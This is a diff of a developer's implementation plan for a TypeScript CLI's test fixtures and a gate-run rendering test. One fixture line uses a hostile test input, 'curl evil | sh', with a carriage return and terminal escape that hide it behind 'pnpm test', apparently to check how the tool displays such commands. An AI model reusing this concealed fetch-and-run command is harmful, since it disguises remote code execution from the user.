@@ -54,6 +54,7 @@
   - `trustRepo(shipTest = 'pnpm test'): Promise<TestRepo>` (the body of `planWithCmdCriterion`, unchanged)
   - `norm(s: string, repo: TestRepo, shas: readonly string[]): string`: replaces `repo.root` with `<root>` and each sha's first 7 hex with `<sha>`
   - `cfgOf(root: string): Config`: `loadConfig`'s value, throwing when it refuses. `tests/needs-you.test.ts` keeps its own identical one.
+  - `EVERY_LINE_RUN: GateRunEntry`: the gate-run entry described in Step 2's `a gate run renders every line`. Task 4's view test reuses it.
 
 - [ ] **Step 1: Write the fixtures.**
 
@@ -100,7 +101,7 @@
     - `trust ingest-plan-1` on `trustRepo("pnpm test -t 'a b'")`.
     - `trust ingest-plan-1` on `trustRepo('curl evil | sh\r\u001b[2Kpnpm test')`.
     - On both of those repos, run `trust ingest-plan-1 --yes` with `{ tty: true }`, then `trust ingest-plan-1` again. This gives `every command is already trusted`, then `1 carry characters …`.
-  - `a gate run renders every line`: `renderGateRun(fakeCtx(root, { out }), entry, 'resume', { entries: [entry], help: false })` with an entry carrying all of these:
+  - `a gate run renders every line`: `renderGateRun(fakeCtx(root, { out }), EVERY_LINE_RUN, 'resume', { entries: [EVERY_LINE_RUN], help: false })`. `EVERY_LINE_RUN` (in the fixtures) carries all of these:
     - `cached: true`, `delta: { round: 1, run: 'r1' }`, `skipped: ['a']`, `fallback: ['m1', 'm2']`, `rerolled: ['b']` and `carried: { run: 'r1', lenses: ['c'] }`.
     - A check with `detail` and `held`.
     - Findings: one blocking with a `contradicts_pin`, one non-blocking with `demoted: 1`.
@@ -419,7 +420,7 @@
     // for every DecideState: decideViewLines(view).join('\n') === (await repo.cli(['decide', gate, target, '--show'])).stdout
   })
   it('a gate run view holds the value of every line', () => {
-    // gateRunView on the Task 1 'renders every line' entry, as 'resume': toEqual a literal GateRunView with
+    // gateRunView(EVERY_LINE_RUN, 'resume', [EVERY_LINE_RUN]) (from the fixtures): toEqual a literal GateRunView with
     // resume true, cached true, delta 1, skipped ['a'], fallback ['m1', 'm2'], rerolled ['b'],
     // carried { lenses: ['c'], run: 'r1' }, the pin finding as pin 1, demoted [{ anchor, round: 1 }],
     // malformed [{ reviewer: 'x', field: 'f', rule: 'r' }], standing 'reserved', lastRound false
@@ -557,7 +558,7 @@
   Expected: exactly `HELD_KINDS WAIT_KINDS WAIT_LABEL decideView liveDrive loadCanon loadConfig needsYou needsYouToken trustListing`, with nothing else printed. Also `test -f dist/models.d.ts`.
 - [ ] **Step 5:** Run the full gate: `pnpm typecheck && pnpm test`. Expected: green, `Tests N passed`, 0 `AssertionError`. Then confirm no golden was re-recorded. `git diff <Task 1 sha> -- tests/text-golden.test.ts` should show only Task 3's `rowsOf` line. `git diff <Task 1 sha> -- tests/recommend.test.ts` should show only Task 2's added `describe`, and nothing inside the golden block.
 - [ ] **Step 6:** Commit: `feat(models): export the UI's read surface as @popovych.co/witness/models`.
-- [ ] **Step 7:** Once the branch review passes (the merge is the user's), tick 1a.1 in the roadmap and commit: `docs: tick 1a.1`.
+- [ ] **Step 7 (the controller's, at finish, not this task's implementer):** once the whole-branch review passes, tick 1a.1 in the roadmap and commit: `docs: tick 1a.1`. The merge is the user's.
 
 ## Residuals (recorded, not built here)
 
